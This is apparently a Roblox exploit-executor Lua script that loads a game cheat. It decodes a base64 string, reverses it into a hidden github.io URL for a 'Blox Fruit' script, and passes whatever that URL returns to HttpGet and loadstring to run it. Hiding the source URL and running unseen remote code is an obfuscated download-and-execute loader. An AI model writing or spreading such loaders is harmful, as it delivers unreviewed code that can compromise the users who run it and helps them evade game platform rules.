
local str = "YXVsLnRpdXJGMDIleG9sQi9YTEJSL29pLmJ1aHRpZy55eWtjdUQvb2kuYnVodGlnLnl5a2N1ZHRzb2hnLy86c3B0dGg="
function decode(strs)
	local code = tostring(strs)
	if  syn and syn.crypt.base64.decode then
		local _Pog = syn.crypt.base64.decode(code)
		return tostring(_Pog);
	else
		local _Pog = base64_decode or base64.decode or crypt.base64decode or crypt.base64.decode or crypt.base64_decode or nil;
		if _Pog ~= nil then
		    _Pog = _Pog(code)
		    return tostring(_Pog);
		end
	end
    return nil;
end
local url = decode(str)
if url ~= nil and type(url) == "string" then
    loadstring(game:HttpGet(tostring(url):reverse(),true))()
else
    local pogger = rconsolewarn or warn
    pogger("Your exploit missing 'base64decode' function")
end
